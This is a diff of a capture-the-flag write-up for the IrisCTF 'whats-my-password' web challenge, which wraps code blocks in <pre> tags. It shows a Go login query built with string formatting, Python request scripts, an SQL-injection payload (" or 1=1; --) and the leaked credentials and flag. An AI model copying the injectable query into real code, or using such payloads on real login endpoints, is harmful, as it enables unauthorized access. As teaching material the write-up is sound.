@@ -31,7 +31,7 @@ User
     <ol>
  
     Starting off I took a look at the provided files.
-
+<pre>
 CREATE DATABASE uwu;
 use uwu;
 
@@ -162,11 +162,13 @@ func main() {
     signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
     <-sigChan
 }
+</pre>
 The important thing to notice here is the SQL-injection vulnerability.
-
+<pre>
 qstring := fmt.Sprintf("SELECT * FROM users WHERE username = \"%s\" AND password = \"%s\"", input.Username, input.Password)
+</pre>
 Knowing this I took a look at the behavior of the endpoint, for this purpose I coded this small python script.
-
+<pre>
 import requests, json
 
 url = "https://whats-my-password-web.chal.irisc.tf/api/login"
@@ -183,12 +185,14 @@ headers = {
 response = requests.post(url, data=json.dumps(data), headers=headers)
 
 print(response.text)
+</pre>
 I used the credentials I found in the sql init file.
-
+<pre>
 kali@kali python3 req.py
 {"username":"root","password":"IamAvEryC0olRootUsr"}
+</pre>
 Seems like we got our credentials back. With this information I concluded that we need to use an SQL-injection to login as the user which has the flag as password.
-
+<pre>
 import requests, json
 
 url = "https://whats-my-password-web.chal.irisc.tf/api/login"
@@ -205,8 +209,9 @@ headers = {
 response = requests.post(url, data=json.dumps(data), headers=headers)
 
 print(response.text)
+</pre>
 It seems that this worked but didn't get us the flag.
-
+<pre>
 kali@kali python3 req.py
 {"username":"root","password":"IamAvEryC0olRootUsr"}
 Getting the credentials from user root back I concluded that if we use " or 1=1; -- we retrieve all credentials stored and it only returns either the first or last of those credentials which in our case is user root. Knowing this I changed the SQL-injection a bit.
@@ -227,10 +232,12 @@ headers = {
 response = requests.post(url, data=json.dumps(data), headers=headers)
 
 print(response.text)
+</pre>
 Using this I returned only user skat which obtains the flag and concludes this writeup.
-
+<pre>
 kali@kali python3 req.py
 {"username":"skat","password":"irisctf{my_p422W0RD_1S_SQl1}"}
+</pre>
     </ol>
 <br>
     <h2>Flag</h2>
